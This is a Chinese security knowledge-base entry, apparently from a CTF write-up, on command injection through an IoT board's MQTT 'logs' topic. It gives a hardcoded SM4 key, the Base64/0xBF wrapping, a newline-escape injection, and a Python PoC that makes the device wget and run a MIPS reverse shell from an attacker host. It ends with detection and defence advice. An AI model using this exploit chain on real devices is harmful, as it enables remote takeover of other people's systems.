---
id: iot-protocol-mqtt-logs-topic-sm4-command-injection
title: MQTT logs topic 命令注入：SM4+0xBF+Base64 封装 info 字段，换行逃逸 system 执行命令
type: scenario
domain: iot
path: iot/protocol
technique: mqtt-logs-topic-sm4-newline-command-injection
aliases:
- mosquitto_sub 命令注入
- MQTT logs topic RCE
- SM4 加密命令注入
- 0xBF base64 MQTT
- 换行命令注入
- IoT 开发板 MQTT RCE
tags:
- iot
- mqtt
- mosquitto
- command-injection
- sm4
- base64
- firmware
- ctf
- rce
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-09'
verification:
  verified_by: verifier-V353
  verified_at: '2026-11-09T00:53:14+08:00'
  notes: 已对照原文与9张图核对；netstat/nginx 8888->1883、logs topic 分发、timestamp 14字符校验、SM4 密钥常量与 0xBF+Base64 封装、换行注入与反弹 shell 复现截图均一致；CTF 板卡无适用软件版本，已清空；未本机复现
---

## 一句话结论

IoT 板上的自定义 `mosquitto_sub` 订阅 `logs` topic，把 JSON 里的 `info` 字段经 Base64 解码、`0xBF` 前缀校验、SM4 解密后交给 `snprintf`/`system` 执行，但校验没有过滤换行符；攻击者构造 `"\n<命令>\n` 作为 `info` 明文，用固件中硬编码的 SM4 密钥加密、加 `0xBF` 前缀再 Base64，发布到 MQTT `logs` topic 即可注入并执行任意命令（原文用 wget 拉取 MIPS 反弹 shell 完成 RCE）。

## 原理

- **消息入口**：开发板运行 mosquitto broker（1883），nginx 把 8888 端口 `proxy_pass` 到 `127.0.0.1:1883`；板上另有一个自定义的 `mosquitto_sub` 进程订阅 `block`/`logs` 等 topic。任何能连上 broker 并 publish 的客户端都能触发其业务逻辑。
- **JSON 协议**：`logs` topic 的消息为 `{"log":1,"timestamp":"xxxx","info":"xxxx"}`。程序解析出 `log`、`timestamp`、`info` 三个字段；`log` 必须为 1。`timestamp` 会被格式校验（14 字符、固定位置的 `-`/`:`）后拼进 `touch /var/log/<timestamp>` 这类命令，因校验严格通常不能注入。
- **info 的解码链**：`info` 字段先 Base64 解码，校验首字节为 `0xBF`，再按 SM4 解密。SM4 密钥由固件中 4 个 32 位常量按小端拼成（`0x9845DC01`、`0x10CD5489`、`0x67BA23FE`、`0xEF32AB76`），逆向可完整恢复。
- **注入点**：解密后的 info2 经过一个字符校验函数（按字符范围/长度过滤），但该函数**没有过滤 `\n`**；info2 随后被 `snprintf` 拼进 shell 命令并由 `system` 执行。用 `"` 闭合模板中的引号上下文后跟换行，即可让 shell 把后续内容当作新命令执行。
- **为什么 payload 要这样封装**：程序只接受“Base64(0xBF + SM4(明文))”格式，直接发命令会被解码/校验拒绝；因此必须复现其加密封装。SM4 密文长度需 ≤ `0x30`，整条注入字符串不超过约 `0x60`，命令要短，明文用 `a` 补齐到 0x20 再加密。
- **利用结果**：发布三条短命令（wget 下载 MIPS little-endian 反弹 shell、chmod +x、执行），即可从板子反弹到攻击机监听端口，获得 shell。

## 触发条件

- 能访问 MQTT 服务（原文板子的 8888 端口转发到 1883；broker 需要账号密码时需已知凭据）。
- 目标上运行着订阅 `logs` topic 的自定义 mosquitto_sub/业务进程，且其 info 处理链最终调用 `snprintf`/`system`。
- 能从固件逆向或流量中恢复 JSON 字段、加密算法、密钥与封装格式（本文为 SM4 + 0xBF + Base64）。
- info2 的校验未过滤换行/引号等 shell 元字符，且目标架构有可用的反向 shell 载荷（本文为 MIPS LE）。

## 利用步骤

1. **信息收集**：`netstat` 看到 1883 mosquitto 与 `mosquitto_sub` 进程，nginx 配置把 8888 转发到 1883；确认 MQTT 服务与 topic。
2. **逆向业务程序**：定位订阅 `logs` 的处理函数，恢复 JSON 格式、SM4 密钥、`0xBF` 前缀与 Base64 封装、长度限制（SM4 密文 ≤ 0x30，总长 ≤ 0x60）。
3. **构造 payload**：明文 = `"\n` + 命令 + `\n`，用 `a` 补齐到 0x20；SM4 加密后前加 `0xBF`，整段 Base64。
4. **发布消息**：连接 broker，向 `logs` topic publish 三条 JSON 消息，分别执行下载、赋权、运行。
5. **建立回连**：攻击机用 `linux/mipsle/shell_reverse_tcp` 生成 ELF，HTTP 服务托管；板子 wget 下载后执行，监听端获得 shell。
6. **验证与善后**：确认命令回显/回连成功；清理下载文件与日志（按需）。

## PoC

```python
import base64, struct, time
import paho.mqtt.client as mqtt
from gmssl.sm4 import CryptSM4, SM4_ENCRYPT

KEY = b''.join(struct.pack('<I', x) for x in
               [0x9845DC01, 0x10CD5489, 0x67BA23FE, 0xEF32AB76])

def wrap(cmd: bytes) -> str:
    plain = (b'"\n' + cmd + b'\n').ljust(0x20, b'a')
    c = CryptSM4(); c.set_key(KEY, SM4_ENCRYPT)
    enc = c.crypt_ecb(plain)                 # 密文需 <= 0x30
    return base64.b64encode(b'\xbf' + enc).decode()

cli = mqtt.Client(mqtt.CallbackAPIVersion.VERSION1)
cli.username_pw_set('user', 'pass')          # 板上给定/弱口令
cli.connect('192.168.1.1', 8888)
for cmd in [b'wget http://<lhost>:9/m', b'chmod +x /m', b'/m']:
    msg = '{"log":1,"timestamp":"11-11-11:11:11","info":"%s"}' % wrap(cmd)
    cli.publish('logs', msg)
    time.sleep(2)
cli.disconnect()
```

反弹 shell 生成：`payload/linux/mipsle/shell_reverse_tcp`，LHOST 为攻击机、LPORT 为监听端口，`generate -f elf -o m`，再用 HTTP 服务托管。

## 变体与关联

- **同类 MQTT 命令注入**：其他 IoT 程序在消息回调中用 `system`/`popen` 拼接消息字段，过滤只做浅层校验；可按同样的“逆向协议 → 构造消息 → 观察回显”思路打。
- **时间戳注入**：本文程序对 `timestamp` 有严格格式校验，未打通；若其他固件校验更松，`touch /var/log/<timestamp>` 本身也是注入点。
- **未授权/弱口令**：MQTT broker 若允许匿名或使用硬编码账号，攻击者可直接发布消息，不需要先拿到 shell。
- **固件逆向**：SM4 表驱动实现（字节表 + 移位/异或）是定位密钥与解码链的关键。

## 检测与防御

- **MQTT 侧**：禁止匿名访问，按用户做 topic ACL（设备只允许发布自己的 topic）；不要把 1883/管理端口暴露到公网，内部也限制来源。
- **程序侧**：绝不把消息字段拼进 shell；需要执行外部命令时用固定参数数组的 `execve`；对字段做白名单校验并过滤 `\n`、`"`、`;`、`|`、`&`、`$()` 等。
- **系统侧**：mosquitto_sub/业务进程以最小权限运行；固件中不硬编码通信密钥与账号，定期轮换。
- **检测**：监控异常 topic 发布（尤其是 Base64 大块字符串）、短时间内连续三条命令式消息、板子异常外连与 wget 行为。
